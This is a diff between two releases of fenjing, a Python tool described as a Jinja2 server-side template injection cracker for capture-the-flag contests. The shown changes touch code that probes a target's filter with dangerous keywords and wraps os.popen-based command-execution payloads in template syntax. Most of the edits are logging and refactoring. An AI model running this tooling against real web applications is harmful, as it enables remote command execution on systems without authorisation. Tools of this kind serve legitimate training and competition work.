# Comparing `tmp/fenjing-0.2.1.tar.gz` & `tmp/fenjing-0.2.2.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "fenjing-0.2.1.tar", last modified: Wed Apr 26 05:03:53 2023, max compression
+gzip compressed data, was "fenjing-0.2.2.tar", last modified: Sun May  7 05:23:39 2023, max compression
```

## Comparing `fenjing-0.2.1.tar` & `fenjing-0.2.2.tar`

### file list

```diff
@@ -1,27 +1,24 @@
-drwxr-xr-x   0 user      (1000) user      (1000)        0 2023-04-26 05:03:53.857000 fenjing-0.2.1/
--rw-r--r--   0 user      (1000) user      (1000)    16725 2023-03-31 12:04:28.000000 fenjing-0.2.1/LICENSE
--rw-r--r--   0 user      (1000) user      (1000)     4188 2023-04-26 05:03:53.857000 fenjing-0.2.1/PKG-INFO
--rwxr-x---   0 user      (1000) user      (1000)     3750 2023-04-26 05:02:41.000000 fenjing-0.2.1/README.md
-drwxr-xr-x   0 user      (1000) user      (1000)        0 2023-04-26 05:03:53.854000 fenjing-0.2.1/fenjing/
--rwxr-xr-x   0 user      (1000) user      (1000)      155 2023-04-26 05:00:35.000000 fenjing-0.2.1/fenjing/__init__.py
--rw-r--r--   0 user      (1000) user      (1000)       60 2023-03-31 08:38:41.000000 fenjing-0.2.1/fenjing/__main__.py
--rw-r--r--   0 user      (1000) user      (1000)     3354 2023-04-26 05:00:35.000000 fenjing-0.2.1/fenjing/cli.py
--rwxr-x---   0 user      (1000) user      (1000)      637 2023-04-02 06:25:33.000000 fenjing-0.2.1/fenjing/example.py
--rwxr-x---   0 user      (1000) user      (1000)       36 2023-03-31 08:02:21.000000 fenjing-0.2.1/fenjing/exceptions.py
--rw-r--r--   0 user      (1000) user      (1000)     2030 2023-04-18 04:22:52.000000 fenjing-0.2.1/fenjing/form.py
--rw-r--r--   0 user      (1000) user      (1000)     4330 2023-04-26 05:00:35.000000 fenjing-0.2.1/fenjing/form_cracker.py
--rwxr-xr-x   0 user      (1000) user      (1000)     2832 2023-04-26 05:00:35.000000 fenjing-0.2.1/fenjing/int_vars.py
--rwxr-xr-x   0 user      (1000) user      (1000)    39085 2023-04-26 05:00:35.000000 fenjing-0.2.1/fenjing/pattern.py
--rw-r--r--   0 user      (1000) user      (1000)    23145 2023-04-26 05:00:35.000000 fenjing-0.2.1/fenjing/payload_gen.py
--rw-r--r--   0 user      (1000) user      (1000)     1543 2023-04-18 04:22:52.000000 fenjing-0.2.1/fenjing/requester.py
--rw-r--r--   0 user      (1000) user      (1000)      895 2023-04-18 04:22:52.000000 fenjing-0.2.1/fenjing/scan_url.py
--rwxr-x---   0 user      (1000) user      (1000)     1719 2023-04-02 05:49:41.000000 fenjing-0.2.1/fenjing/shell_cmd.py
--rwxr-xr-x   0 user      (1000) user      (1000)     2270 2023-04-26 05:00:35.000000 fenjing-0.2.1/fenjing/shell_payload.py
-drwxr-xr-x   0 user      (1000) user      (1000)        0 2023-04-26 05:03:53.857000 fenjing-0.2.1/fenjing.egg-info/
--rw-r--r--   0 user      (1000) user      (1000)     4188 2023-04-26 05:03:53.000000 fenjing-0.2.1/fenjing.egg-info/PKG-INFO
--rw-r--r--   0 user      (1000) user      (1000)      465 2023-04-26 05:03:53.000000 fenjing-0.2.1/fenjing.egg-info/SOURCES.txt
--rw-r--r--   0 user      (1000) user      (1000)        1 2023-04-26 05:03:53.000000 fenjing-0.2.1/fenjing.egg-info/dependency_links.txt
--rw-r--r--   0 user      (1000) user      (1000)       30 2023-04-26 05:03:53.000000 fenjing-0.2.1/fenjing.egg-info/requires.txt
--rw-r--r--   0 user      (1000) user      (1000)        8 2023-04-26 05:03:53.000000 fenjing-0.2.1/fenjing.egg-info/top_level.txt
--rw-r--r--   0 user      (1000) user      (1000)       38 2023-04-26 05:03:53.858000 fenjing-0.2.1/setup.cfg
--rw-r--r--   0 user      (1000) user      (1000)      860 2023-03-31 12:05:47.000000 fenjing-0.2.1/setup.py
+drwxr-xr-x   0 user      (1000) user      (1000)        0 2023-05-07 05:23:39.378000 fenjing-0.2.2/
+-rw-r--r--   0 user      (1000) user      (1000)    16725 2023-03-31 12:04:28.000000 fenjing-0.2.2/LICENSE
+-rw-r--r--   0 user      (1000) user      (1000)     4188 2023-05-07 05:23:39.378000 fenjing-0.2.2/PKG-INFO
+-rwxr-xr-x   0 user      (1000) user      (1000)     3750 2023-05-07 05:21:47.000000 fenjing-0.2.2/README.md
+drwxr-xr-x   0 user      (1000) user      (1000)        0 2023-05-07 05:23:39.376000 fenjing-0.2.2/fenjing/
+-rwxr-xr-x   0 user      (1000) user      (1000)      152 2023-05-07 05:22:05.000000 fenjing-0.2.2/fenjing/__init__.py
+-rw-r--r--   0 user      (1000) user      (1000)       60 2023-03-31 08:38:41.000000 fenjing-0.2.2/fenjing/__main__.py
+-rw-r--r--   0 user      (1000) user      (1000)     3489 2023-05-07 05:22:05.000000 fenjing-0.2.2/fenjing/cli.py
+-rwxr-x---   0 user      (1000) user      (1000)      637 2023-04-02 06:25:33.000000 fenjing-0.2.2/fenjing/example.py
+-rwxr-x---   0 user      (1000) user      (1000)       36 2023-03-31 08:02:21.000000 fenjing-0.2.2/fenjing/exceptions.py
+-rw-r--r--   0 user      (1000) user      (1000)     4726 2023-05-07 05:22:05.000000 fenjing-0.2.2/fenjing/form_cracker.py
+-rwxr-xr-x   0 user      (1000) user      (1000)     2832 2023-04-26 05:00:35.000000 fenjing-0.2.2/fenjing/int_vars.py
+-rwxr-xr-x   0 user      (1000) user      (1000)    39085 2023-04-26 05:00:35.000000 fenjing-0.2.2/fenjing/pattern.py
+-rw-r--r--   0 user      (1000) user      (1000)    27490 2023-05-07 05:22:05.000000 fenjing-0.2.2/fenjing/payload_gen.py
+-rw-r--r--   0 user      (1000) user      (1000)     1078 2023-05-07 05:22:05.000000 fenjing-0.2.2/fenjing/scan_url.py
+-rwxr-xr-x   0 user      (1000) user      (1000)     2332 2023-05-07 05:22:05.000000 fenjing-0.2.2/fenjing/shell_payload.py
+drwxr-xr-x   0 user      (1000) user      (1000)        0 2023-05-07 05:23:39.377000 fenjing-0.2.2/fenjing.egg-info/
+-rw-r--r--   0 user      (1000) user      (1000)     4188 2023-05-07 05:23:39.000000 fenjing-0.2.2/fenjing.egg-info/PKG-INFO
+-rw-r--r--   0 user      (1000) user      (1000)      407 2023-05-07 05:23:39.000000 fenjing-0.2.2/fenjing.egg-info/SOURCES.txt
+-rw-r--r--   0 user      (1000) user      (1000)        1 2023-05-07 05:23:39.000000 fenjing-0.2.2/fenjing.egg-info/dependency_links.txt
+-rw-r--r--   0 user      (1000) user      (1000)       30 2023-05-07 05:23:39.000000 fenjing-0.2.2/fenjing.egg-info/requires.txt
+-rw-r--r--   0 user      (1000) user      (1000)        8 2023-05-07 05:23:39.000000 fenjing-0.2.2/fenjing.egg-info/top_level.txt
+-rw-r--r--   0 user      (1000) user      (1000)       38 2023-05-07 05:23:39.378000 fenjing-0.2.2/setup.cfg
+-rw-r--r--   0 user      (1000) user      (1000)      860 2023-03-31 12:05:47.000000 fenjing-0.2.2/setup.py
```

### Comparing `fenjing-0.2.1/LICENSE` & `fenjing-0.2.2/LICENSE`

 * *Files identical despite different names*

### Comparing `fenjing-0.2.1/PKG-INFO` & `fenjing-0.2.2/PKG-INFO`

 * *Files 2% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: fenjing
-Version: 0.2.1
+Version: 0.2.2
 Summary: A Jinja2 SSTI cracker for CTF competitions
 Home-page: https://github.com/Marven11/Fenjing
 Author: Marven11
 Author-email: marven11@example.com
 Classifier: Programming Language :: Python :: 3.9
 Classifier: License :: OSI Approved :: Mozilla Public License 2.0 (MPL 2.0)
 Classifier: Operating System :: OS Independent
```

### Comparing `fenjing-0.2.1/README.md` & `fenjing-0.2.2/README.md`

 * *Files identical despite different names*

### Comparing `fenjing-0.2.1/fenjing/cli.py` & `fenjing-0.2.2/fenjing/cli.py`

 * *Files 8% similar despite different names*

```diff
@@ -1,23 +1,27 @@
 import logging
 from urllib.parse import urlparse
 from traceback import print_exc
 
-from .form import Form
+from .utils.form import Form
 from .form_cracker import FormCracker
 from .scan_url import yield_form
-from .requester import Requester, DEFAULT_USER_AGENT
+from .utils.requester import Requester, DEFAULT_USER_AGENT
+from .utils.colorize import colored
 import click
 
-logging.basicConfig(level=logging.INFO)
+logging.basicConfig(
+    level=logging.INFO,
+    format="%(levelname)s[%(name)s]: %(message)s"
+)
 logger = logging.getLogger("cli")
 
 
 def interact(cmd_exec):
-    logger.warning("Use Ctrl+D to exit.")
+    logger.info(f"Use {colored('cran', 'Ctrl+D', bold=True)} to exit.")
     while True:
         try:
             cmd = input("$>> ")
         except EOFError:
             break
         except KeyboardInterrupt:
             break
```

### Comparing `fenjing-0.2.1/fenjing/example.py` & `fenjing-0.2.2/fenjing/example.py`

 * *Files identical despite different names*

### Comparing `fenjing-0.2.1/fenjing/form_cracker.py` & `fenjing-0.2.2/fenjing/form_cracker.py`

 * *Files 8% similar despite different names*

```diff
@@ -1,14 +1,15 @@
 from urllib.parse import urlparse
 from collections import Counter, namedtuple
 from functools import lru_cache
 import logging
 
-from . import form
-from .requester import Requester
+from .utils import form
+from .utils.requester import Requester
+from .utils.colorize import colored
 from .shell_payload import exec_cmd_payload
 
 
 logger = logging.getLogger("form_cracker")
 Result = namedtuple("Result", "payload_generate_func input_field")
 
 
@@ -51,76 +52,80 @@
         assert r is not None
         return [
             k for k, v in fill_dict.items()
             if v in r.text
         ]
 
     def submit(self, inputs: dict):
-        logger.info(f"submit {inputs}")
+        # logger.info(f"submit {inputs}")
         all_length = sum(len(v) for v in inputs.values())
         if all_length > 2048 and self.form["method"] == "GET":
             logger.warning(
                 f"inputs are extremely long (len={all_length}) that the request might fail")
         return self.req.request(
             **form.fill_form(self.url, self.form, inputs))
 
     def waf_page_hash(self, input_field: str):
-        resps = {
-            keyword: self.submit({input_field: keyword * 3})
-            for keyword in self.dangerous_keywords
-        }
+        resps = {}
+        for keyword in self.dangerous_keywords:
+            logger.info(f"Testing dangerous keyword {colored('yellow', repr(keyword * 3))}")
+            resps[keyword] = self.submit({input_field: keyword * 3})
+        # resps = {
+        #     keyword: self.submit({input_field: keyword * 3})
+        #     for keyword in self.dangerous_keywords
+        # }
         hashes = [
             hash(r.text) for r in resps.values()
             if r is not None and r.status_code != 500
         ]
         return [pair[0] for pair in Counter(hashes).most_common(2)]
 
     def crack_inputs(self, input_field):
-        logger.info(f"Testing {input_field}")
+        logger.info(f"Testing {colored('yellow', input_field)}")
 
         waf_hashes = self.waf_page_hash(input_field)
 
-        @lru_cache(100)
+        @lru_cache(1000)
         def waf_func(value):
             r = self.submit({input_field: value})
             assert r is not None
             return hash(r.text) not in waf_hashes
 
         payload, will_echo = exec_cmd_payload(waf_func, self.test_cmd)
         if payload is None:
             return None
         if will_echo:
-            logger.warning(
-                f"Input {input_field} looks great, testing generated payload.")
+            logger.info(
+                f"Input {colored('yellow', repr(input_field))} looks great, testing generated payload.")
             r = self.submit({input_field: payload})
             assert r is not None
             if self.test_result in r.text:
-                logger.warning(f"Success! return a payload generator.")
+                logger.info(f"{colored('green', 'Success!')} Now we can generate payloads.")
             else:
-                logger.warning(
-                    f"Test Payload Failed! return a payload generator anyway.")
+                logger.info(
+                    f"{colored('yellow', 'Test Payload Failed', bold=True)}! Generated payloads might be useless.")
             return Result(
                 payload_generate_func=(
                     lambda cmd: exec_cmd_payload(waf_func, cmd)[0]),
                 input_field=input_field
             )
         else:
-            logger.warning(
+            logger.info(
                 f"Input {input_field} looks great, but we WON'T SEE the execution result! " +
-                "You can try using the payload generator anyway.")
+                "You can try generating payloads anyway.")
             return Result(
                 payload_generate_func=(
                     lambda cmd: exec_cmd_payload(waf_func, cmd)[0]),
                 input_field=input_field
             )
 
     def crack(self):
         logger.info(f"Start cracking {self.form}")
         vulunables = self.vulunable_inputs()
-        logger.info(f"These inputs might be vulunable: {vulunables}")
+        logger.info(f"These inputs might be vulunable: {colored('yellow', repr(vulunables))}")
 
         for input_field in vulunables:
             result = self.crack_inputs(input_field)
             if result:
                 return result
         logger.warning(f"Failed...")
         return None
```

### Comparing `fenjing-0.2.1/fenjing/int_vars.py` & `fenjing-0.2.2/fenjing/int_vars.py`

 * *Files identical despite different names*

### Comparing `fenjing-0.2.1/fenjing/pattern.py` & `fenjing-0.2.2/fenjing/pattern.py`

 * *Files identical despite different names*

### Comparing `fenjing-0.2.1/fenjing/shell_payload.py` & `fenjing-0.2.2/fenjing/shell_payload.py`

 * *Files 22% similar despite different names*

```diff
@@ -1,13 +1,14 @@
 from . import payload_gen
 from .int_vars import get_useable_int_vars
 
 import logging
+from .utils.colorize import colored
 
-logger = logging.Logger("shell_payload")
+logger = logging.getLogger("shell_payload")
 
 
 def get_int_context(waf_func):
     ints, var_names, payload = get_useable_int_vars(waf_func)
     if len(ints) == 0:
         logger.warning("No IntVars For YOU!")
     return payload, dict(zip(var_names, ints))
@@ -26,32 +27,34 @@
 
 
 def exec_cmd_payload(waf_func, cmd):
 
     int_payload, int_context = get_int_context(waf_func)
     str_payload, str_context = get_str_context(waf_func)
     before_payload, context = int_payload + str_payload, {**int_context, **str_context}
-    will_print = True
-    if waf_func("{{"):
-        outer_pattern = "{{PAYLOAD}}"
-    elif waf_func("{%print()%}"):
-        logging.warning("{{ is being waf, using {%print()%}!")
-        outer_pattern = "{%print(PAYLOAD)%}"
-    elif waf_func("{%if()%}{%endif%}"):
-        will_print = False
-        logging.warning("{{ is being waf, no execute result for you!")
-        outer_pattern = "{%if(PAYLOAD)%}{%endif%}"
-    elif waf_func("{% set x= %}"):
-        will_print = False
-        logging.warning("{{ is being waf, no execute result for you!")
-        outer_pattern = "{% set x=PAYLOAD %}"
+    outer_payloads = [
+        ("{{}}", "{{PAYLOAD}}", True),
+        ("{%print()%}", "{%print(PAYLOAD)%}", True),
+        ("{%if()%}{%endif%}", "{%if(PAYLOAD)%}{%endif%}", False),
+        ("{% set x= %}", "{% set x=PAYLOAD %}", False),
+    ]
+    outer_pattern, will_print = None, None
+    for test_payload, outer_pattern, will_print in outer_payloads:
+        if waf_func(test_payload):
+            break
     else:
-        logging.warning("LOTS OF THINGS is being waf, NOTHING FOR YOU!")
+        logger.warning("LOTS OF THINGS is being waf, NOTHING FOR YOU!")
         return None, None
 
+    if will_print:
+        logger.info(f"use {colored('blue', outer_pattern)}")
+    else:
+        logger.warning(f"use {colored('blue', outer_pattern)}, which {colored('red', 'will not print')} your result!")
+
+
     inner_payload = payload_gen.generate(
         payload_gen.OS_POPEN_READ,
         cmd,
         waf_func=waf_func,
         context=context
     )
     if inner_payload is None:
```

### Comparing `fenjing-0.2.1/fenjing.egg-info/PKG-INFO` & `fenjing-0.2.2/fenjing.egg-info/PKG-INFO`

 * *Files 2% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: fenjing
-Version: 0.2.1
+Version: 0.2.2
 Summary: A Jinja2 SSTI cracker for CTF competitions
 Home-page: https://github.com/Marven11/Fenjing
 Author: Marven11
 Author-email: marven11@example.com
 Classifier: Programming Language :: Python :: 3.9
 Classifier: License :: OSI Approved :: Mozilla Public License 2.0 (MPL 2.0)
 Classifier: Operating System :: OS Independent
```

### Comparing `fenjing-0.2.1/setup.py` & `fenjing-0.2.2/setup.py`

 * *Files identical despite different names*

